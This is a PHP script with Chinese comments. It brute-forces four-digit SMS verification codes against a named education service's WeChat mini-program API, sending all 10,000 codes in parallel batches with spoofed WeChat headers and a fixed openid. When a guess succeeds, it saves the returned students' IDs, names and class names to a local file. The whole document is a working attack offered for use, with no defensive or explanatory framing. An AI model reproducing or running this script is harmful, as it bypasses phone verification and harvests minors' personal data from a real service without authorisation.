<?php
$phone = $_GET['phone'] ?? '';
// 设置开始时间
$startTime = microtime(true);

// 初始化 cURL 会话数组
$curl_handles = array();
$multi_handle = curl_multi_init();

// 设置并行请求的最大数量
$max_parallel = 10; // 可以根据实际情况调整

// 循环发送请求
for ($i = 0; $i <= 9999; $i++) {
    // 设置顺序码
    $code = str_pad($i, 4, "0", STR_PAD_LEFT);
    
    // 初始化 cURL 会话
    $ch = curl_init();

    // 设置 cURL 选项
    curl_setopt($ch, CURLOPT_URL, 'https://edu.hishizi.com/api/api/h5/checkCode');
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(array(
        "phone" => $phone,
        "code" => $code,
        "openid" => "oQVPw5Oi8a2_zX23rS_xvGX4ctT0"
    )));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11581',
        'Content-Type: application/json',
        'xweb_xhr: 1',
        'x-ajax: json',
        'x-requested-with: XMLHttpRequest',
        'source: app',
        'Sec-Fetch-Site: cross-site',
        'Sec-Fetch-Mode: cors',
        'Sec-Fetch-Dest: empty',
        'Referer: https://servicewechat.com/wx994917d030b9402a/140/page-frame.html',
        'Accept-Language: zh-CN,zh;q=0.9'
    ));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // 将 cURL 会话添加到数组中
    $curl_handles[$i] = $ch;
    
    // 添加到多路复用句柄
    curl_multi_add_handle($multi_handle, $ch);
    
    // 如果达到并行请求的最大数量，执行并行请求
    if (count($curl_handles) >= $max_parallel) {
        execute_parallel_requests($multi_handle, $curl_handles, "yzm.ini");
        // 重置 cURL 会话数组
        $curl_handles = array();
    }
}

// 执行剩余的并行请求
if (!empty($curl_handles)) {
    execute_parallel_requests($multi_handle, $curl_handles, "yzm.ini");
}

// 关闭多路复用句柄
curl_multi_close($multi_handle);

// 执行并行请求的函数
function execute_parallel_requests($multi_handle, &$curl_handles, $filename) {
    do {
        curl_multi_exec($multi_handle, $running);
        curl_multi_select($multi_handle);
    } while ($running > 0);

    foreach ($curl_handles as $index => $ch) {
        $response = curl_multi_getcontent($ch);
        $data = json_decode($response, true);

        if ($data !== null && isset($data['data']) && $data['data'] !== null) {
            // 仅展示正确的结果
            $studentList = $data['data']['studentList'];
            foreach ($studentList as $student) {
                // 将结果写入文件
                $content = "Array ("
                        . " [code] => " . str_pad($index, 4, "0", STR_PAD_LEFT)
                        . " [id] => " . $student['id']
                        . " [name] => " . $student['name']
                        . " [className] => " . $student['className']
                        . " )\n";
                file_put_contents($filename, $content, FILE_APPEND);
            }
        }

        curl_multi_remove_handle($multi_handle, $ch);
        curl_close($ch);
    }
}

// 确保所有操作在5分钟内完成
if (microtime(true) - $startTime > 300) {
    echo "Time limit exceeded. Operations did not complete within 5 minutes.";
}
?>